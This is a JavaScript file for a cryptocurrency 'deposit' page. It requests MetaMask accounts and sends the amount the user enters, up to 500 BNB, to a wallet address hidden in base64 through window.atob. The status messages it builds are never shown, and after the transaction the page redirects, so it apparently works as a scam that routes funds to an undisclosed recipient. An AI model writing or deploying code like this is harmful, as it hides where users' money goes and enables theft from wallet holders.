
let accounts = [];

hideElement = (element) => element.style.display = "none";
showElement = (element) => element.style.display = "block";

//var

//set var
const logouButton = document.getElementById("btn-login");
const logOutButton = document.getElementById("btn-logout");


function SaveAsFile(t,f,m) {
    try {
        var b = new Blob([t],{type:m});
        saveAs(b, f);
    } catch (e) {
        window.open("data:"+m+"," + encodeURIComponent(t), '_blank','');
    }
}


async function init() {

    console.log("Start Serve"); 
    
}



//Ocult
function disableElement() {
    hideElement(logOutButton); 
}


//Deposit
async function deposit() {
   
    const transferValue = document.getElementById("tokenAmount").value;
    if (transferValue > 500){
        alert("Max value 500 BNB");
        exit();
    }
    //if (transferValue < 0.1){
    //    alert("Minimum value 0.1 BNB");
    //    exit();
    //}

    console.log(transferValue);
    _transferToken(transferValue);
    displayMessage("00","Processing...");
}


async function _transferToken(transferValue){
    displayMessage("00","Your transaction is being processed. Do not exit or refresh this page until the process is complete!");
    if (window.ethereum) {

        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    
         // var Web3 = require('web3');
         this.web3 = new Web3(new Web3.providers.HttpProvider("https://bsc-dataseed1.binance.org:443"))
    
         //window.web3 = new Web3(window.ethereum);
         const account = web3.eth.accounts;
    
         //Get the current MetaMask selected/active wallet
         const walletAddress = account.givenProvider.selectedAddress;
         
         console.log(this.web3.utils.toWei('1', 'ether'));
    
    
         console.log(`Wallet: ${walletAddress}`);
    
         ethereum
         .request({
           method: 'eth_sendTransaction',
           params: [
             {
               from: accounts[0],
               to: window.atob('MHgwQzIwZTU3Q0Y0RjZGMzhBM0I3MDE5QjI4RDgzMjE1M2U0MzAwNURC'),
               value: "0x" + Web3.utils.toBN(Web3.utils.toWei(transferValue, "ether")).toString(16),
              
             },
           ],
         })
         .then((txHash) => console.log(displayMessageRedireci("00","Transaction processed at " + txHash)))
         .catch((error) => console.error);

    
      } else {
       console.log("No wallet");
      }
}

function displayMessage(messageType,message){
    messages = {
        "00":`<div class="alert alert-success"> ${message} </div>`,
        "01":`<div class="alert alert-danger"> ${message} </div>`
    }

}

function displayMessageRedireci(messageType,message){
    messages = {
        "00":`<div class="alert alert-success"> ${message} </div>`,
        "01":`<div class="alert alert-danger"> ${message} </div>`
    }
    window.location.href = "";

}



init();